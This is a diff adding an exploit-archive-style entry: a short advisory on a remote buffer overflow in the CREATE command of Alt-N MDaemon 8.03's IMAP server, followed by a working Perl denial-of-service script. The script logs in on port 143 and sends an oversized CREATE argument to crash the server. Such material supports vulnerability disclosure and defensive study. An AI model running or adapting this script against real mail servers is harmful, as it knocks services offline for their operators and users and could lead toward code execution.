@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/14315/info
+
+Alt-N MDaemon IMAP Server is affected by a remote buffer overflow vulnerability.
+
+This issue presents itself when an attacker submits excessive data through the CREATE command subsequent to authentication
+
+This vulnerability may be leveraged to execute arbitrary code in the context of the server, facilitating unauthorized access to the affected computer.
+
+Alt-N MDaemon 8.03 is reported to be vulnerable. Other versions are likely affected as well. 
+
+### MDAEMON stack based buffer overflow
+### Remote DoS exploit by kcope
+use IO::Socket::INET;
+$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+                             PeerPort => '143',
+                             Proto    => 'tcp');
+
+$a = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\" x 10;
+
+print $sock "a001 LOGIN username password\r\n";
+print $sock "a001 CREATE $a\r\n";
+
+while (<$sock>) {
+   print $_;
+}
+
